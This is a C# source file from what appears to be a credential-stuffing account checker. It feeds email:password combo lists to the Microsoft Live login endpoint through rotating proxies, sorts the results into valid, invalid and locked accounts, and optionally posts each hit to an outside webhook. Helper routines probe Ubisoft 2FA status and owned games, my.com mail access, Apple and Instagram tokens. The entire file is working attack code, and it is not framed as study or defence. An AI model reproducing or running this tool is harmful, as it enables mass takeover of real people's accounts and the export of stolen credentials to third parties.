using System; using Galaxy.Mainm;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using AuthGG;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class Hotmail1kek
	{
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();
		public static void startchecker1()
		{
			for (; ; )
			{
				while (!Hotmail1check.Combo.IsEmpty)
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Hotmail1check.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.IgnoreProtocolErrors = true;
								if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = Hotmail1check.RandomProxies();
								httpRequest.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
								httpRequest.AddHeader("accept-encoding", "null");
								httpRequest.AddHeader("accept-language", "en-US,en;q=0.9");
								httpRequest.AddHeader("cache-control", "max-age=0");
								httpRequest.AddHeader("content-length", "577");
								httpRequest.AddHeader("content-type", "application/x-www-form-urlencoded");
								httpRequest.AddHeader("cookie", "mkt=en-US; IgnoreCAW=1; MSCC=78.154.246.156-KW; MSPPre=c30e7cc3fc@firemailbox.club|209e2c9ba7f028c9||; MSPCID=209e2c9ba7f028c9; NAP=V=1.9&E=185a&C=YwJQ3-nJ3Oxms7ZqjKRPmeqfVlRl1_r70wln_ZOIIG3EyoRB16iTiA&W=2; ANON=A=45999FA1DB485D6EB926DA6BFFFFFFFF&E=18b4&W=2; SDIDC=CVuLKa5AIHJ5uwsBaOQt8nGLrmHZTYIsLuioHo6G0FNowfAcDMZkbAps9l0rcBGO540QWpXVPvUAcIQ1L7tlq06*97mj8ZAenWxDZuZRVsBTRVzzTnBfzvmhgDEo4xDK0aUQqANO3lggDjmIQkuueQtAlU*DfXR6rjEXlFsapFcCrsaYZoCXLgY*ou8MgnpDHUtA6Slww6NNLWwU!TdvMvo$; uaid=e94a49f177664960a3fca122edaf8a27; MSPOK=$uuid-5b220485-c233-4727-af20-52793217a373$uuid-029049e1-c2db-4c4e-83f1-7b736e9b8c34; wlidperf=FR=L&ST=1603778552344");
								httpRequest.AddHeader("origin", "https://login.live.com");
								httpRequest.AddHeader("referer", "https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1&contextid=C61E086B741A7BC9&bk=1573475927&uaid=e94a49f177664960a3fca122edaf8a27&pid=0");
								httpRequest.AddHeader("sec-fetch-dest", "document");
								httpRequest.AddHeader("sec-fetch-mode", "navigate");
								httpRequest.AddHeader("sec-fetch-site", "same-origin");
								httpRequest.AddHeader("sec-fetch-user", "?1");
								httpRequest.AddHeader("upgrade-insecure-requests", "1");
								httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36");
								var res0 = httpRequest.Post("https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1&contextid=C61E086B741A7BC9&bk=1603778533&uaid=e94a49f177664960a3fca122edaf8a27&pid=0", "i13=0&login=" + email + "&loginfmt=" + email + "&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DUFc1dzD7yfbc6p1hw0Cd65jSD5xqvLeZIGaSdFAY0DtnynhExxOcwym3FibChimglSUc8j4bxbFM8qQ0vCPRsAEM2U623Kd9OztNH%21NBFY20tDsPhoUIuEUzMmTHEKXUWGC5qFYjOglF6yw*T14eF4b9JjU0%21JvLg41z6jonbYfBwY7F8rot5MTOPKnxlyiM3rf0jyeGb4tqHwmwhKPYzA%24&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i2=1&i17=0&i18=&i19=18405", "application/x-www-form-urlencoded");
								string text0 = res0.ToString();
								if (text0.Contains("name=\"ANON\"") || text0.Contains("https://account.live.com/profile/accrue?mkt=") || text0.Contains($"sSigninName:'{email}',bG:'https://login.live.com/gls.srf") || text0.Contains("name=\\\"t\\\" id=\\\"t\\\"") || text0.Contains("type=\"hidden\" name=\"t\" id=\"t\" value=\""))
								{
									lock (Program.WriteLock)
									{
										Interlocked.Increment(ref Hotmail1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
										Interlocked.Increment(ref Hotmail1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
										Interlocked.Increment(ref Hotmail1check.Hits); Interlocked.Increment(ref stats.hits);
										if (Program.config.showgood == "True" && Program.config.ui == 2)
										{
											Colorful.Console.WriteLine("[»] Valid " + account, Color.Green);
										}
										if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString();}Save(Path + "\\Valid.txt", account);
									}
									break;
								}
								else if (text0.Contains("incorrect account or password.\",") || text0.Contains("timed out"))
								{
									lock (Program.WriteLock)
									{
										Interlocked.Increment(ref Hotmail1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
										Interlocked.Increment(ref Hotmail1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
										Interlocked.Increment(ref Hotmail1check.Bad); Interlocked.Increment(ref stats.bad);
										if (Program.config.showbad == "True" && Program.config.ui == 2)
										{
											Colorful.Console.WriteLine("[»] Invalid " + account, Color.Red);
										}
										Save(Path + "\\Invalid.txt", account);
									}
									break;
								}
								else if (text0.Contains("account.live.com/recover?mkt") || text0.Contains("recover?mkt") || text0.Contains("account.live.com/identity/confirm?mkt") || text0.Contains("Email/Confirm?mkt") || text0.Contains("/cancel?mkt=") || text0.Contains("/Abuse?mkt=") || text0.Contains("JavaScript required to sign in"))
								{
									lock (Program.WriteLock)
									{
										Interlocked.Increment(ref Hotmail1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
										Interlocked.Increment(ref Hotmail1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
										Interlocked.Increment(ref Hotmail1check.custom);
										if (Program.config.showlocked == "True" && Program.config.ui == 2)
										{
											Colorful.Console.WriteLine("[»] Custom " + account, Color.LightPink);
										}
										if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString();}Save(Path + "\\Custom.txt", account);
									}
									break;
								}
								else
								{
									string acc1 = email + ":" + password;
									Hotmail1check.Combo.Enqueue(acc1);
									Interlocked.Increment(ref Hotmail1check.retry);
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Hotmail1check.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Hotmail1check.retry);
							}
						}
					}
				}
			}
		}
		private readonly Random _random = new Random();
		private static string RandomString(int length)
		{
			const string pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			var builder = new StringBuilder();

			for (var i = 0; i < length; i++)
			{
				var c = pool[random.Next(0, pool.Length)];
				builder.Append(c);
			}

			return builder.ToString();
		}
		static string AppleGetToken(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = Hotmail1check.RandomProxies();
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";
						httpRequest.AddHeader("Accept", "*/*");

						string strResponse = httpRequest.Get(new Uri("https://secure4.store.apple.com/shop/sign_in?c=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ&r=SCDHYHP7CY4H9XK2H&s=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ")).ToString();

						if (strResponse.Contains("stk\":\""))
						{
							return Regex.Match(strResponse, "stk\":\"(.*?)\"}").Groups[1].Value;
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref Hotmail1check.retry);
				}
			}
		}
			


						public int RandomNumber(int min, int max)
		{
			return _random.Next(min, max);
		}

		static Random random = new Random();
		public string RandomString(int size, bool lowerCase = false)
		{
			var builder = new StringBuilder(size);

			// char is a single Unicode character  
			char offset = lowerCase ? 'a' : 'A';
			const int lettersOffset = 26; // A...Z or a..z: length = 26  

			for (var i = 0; i < size; i++)
			{
				var @char = (char)_random.Next(offset, offset + lettersOffset);
				builder.Append(@char);
			}

			return lowerCase ? builder.ToString().ToLower() : builder.ToString();
		}
		public string RandomPassword()
		{
			var passwordBuilder = new StringBuilder();

			// 4-Digits between 1000 and 9999  
			passwordBuilder.Append(RandomNumber(1000, 9999));

			// 2-Letters upper case  
			passwordBuilder.Append(RandomString(2));
			return passwordBuilder.ToString();
		}
		public static string GetRandomHexNumber(int digits)
		{
			byte[] buffer = new byte[digits / 2];
			random.NextBytes(buffer);
			string result = String.Concat(buffer.Select(x => x.ToString("X2")).ToArray());
			if (digits % 2 == 0)
				return result;
			return result + random.Next(16).ToString("X");
		}
		private static string UPlayHas2FA(string ticket, string sessionId)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = Hotmail1check.RandomProxies();
						req.AddHeader("Ubi-SessionId", sessionId);
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string str = req.Get(new Uri("https://public-ubiservices.ubi.com/v3/profiles/me/2fa")).ToString();
						if (str.Contains("active"))
						{
							if (str.Contains("true"))
								return "true";
							if (str.Contains("false"))
								return "false";
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref Hotmail1check.retry);
				}
			}
		}

		private static string UPlayGetGames(string ticket)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = Hotmail1check.RandomProxies();
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string input = req.Get(new Uri("https://public-ubiservices.ubi.com/v1/profiles/me/club/aggregation/website/games/owned")).ToString();
						if (input.Contains("[") && input != "[]")
						{
							Match match1 = Regex.Match(input, "\"slug\":\"(.*?)\"");
							Match match2 = Regex.Match(input, "\"platform\":\"(.*?)\"");
							string str1 = "";
							string str2;
							while (true)
							{
								str2 = str1 + "[" + match1.Groups[1].Value + " - " + match2.Groups[1].Value + "]";
								match1 = match1.NextMatch();
								match2 = match2.NextMatch();
								if (!(match1.Groups[1].Value == ""))
									str1 = str2 + ", ";
								else
									break;
							}
							return str2;
						}
					}
				}
				catch
				{
				}
			}
		}

			private static string MailAccessCheck(string email, string password)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = Hotmail1check.RandomProxies();
						httpRequest.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
						if (httpRequest.Get(new Uri("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + email + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + password + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString().Contains("Ok=1"))
							return "Working";
						break;
					}
				}
				catch
				{
					string acc1 = email + ":" + password;
					Hotmail1check.Combo.Enqueue(acc1);
					Interlocked.Increment(ref Hotmail1check.retry);
				}
			}
			return "";
		}
		private static string InstagramGetCSRF(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = Hotmail1check.RandomProxies();
						httpRequest.IgnoreProtocolErrors = true;
						httpRequest.AllowAutoRedirect = false;
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";
						httpRequest.Get(new Uri("https://i.instagram.com/api/v1/accounts/login/")).ToString();
						return cookies.GetCookies("https://i.instagram.com")["csrftoken"].Value;
					}
				}
				catch
				{
					Interlocked.Increment(ref Hotmail1check.retry);
				}
			}
		}

		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}
		public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
		public static string uri = "";

		public static string auther = "";

		public static string showbad = "";

		public static string showlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
